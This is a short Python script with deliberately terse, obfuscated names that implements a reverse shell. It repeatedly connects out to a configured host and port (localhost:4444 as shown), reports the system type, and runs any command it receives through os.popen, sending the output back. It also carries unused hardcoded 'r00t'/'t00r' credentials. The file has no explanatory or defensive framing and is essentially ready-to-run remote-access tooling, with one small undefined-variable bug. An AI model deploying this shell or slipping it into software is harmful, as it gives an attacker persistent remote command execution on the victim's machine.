import socket, select, os
from time import sleep, time

lr = {"ht": "127.0.0.1","pt": 4444, "pr": True}; ah = {"ee": False,"ur": "r00t","pd": "t00r"}; sd = "/"

def __rr(c,b = 2048,rt = 0.2, it = 300, ut = 0):
	ut = time()
	try:
		c.setblocking(0)
		d = ""
		while True:
			r = select.select([c], [], [], rt)
			if r[0]:
				d += c.recv(b)
			else:
				if it != 0:
					if it <= time() - ut:
						return False
				if len(d) > 0:
					c.setblocking(1)
					return d
	except socket.error:
		return False

def __dr(d):
	if d:
		return d.replace("\n","").replace("\r","")
	return False

def __cd(cd):
	try:
		if cd[0:2] == "cd" and cd[2] == " ":
			d = cd[3:len(cd)].replace("\"","").replace("\'",""); os.chdir(d); return ""
		elif cd[0:2] == "cd" and len(command) == 2:
			os.chdir(sd); return ""
		else:
			return os.popen(cd).read().replace("\n","\r\n")
	except:
		return False
def __rl(s):
	s.send("%s"%(__cd("uname -ms")))
	while True:
		try:
			s.send("[%s]> "%(os.getcwd())); d = __dr(__rr(s))
			if d == "exit" or d == False:
				s.close(); return False
			else:
				s.send(__cd(d))
		except socket.error:
			s.close(); return False

def __cl(s = None):
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lr["ht"],lr["pt"]))
			if lr["pr"]:
				__rl(s)
			else:
				break
		except socket.error:
			pass
		sleep(3)
	__rl(s)
__cl()
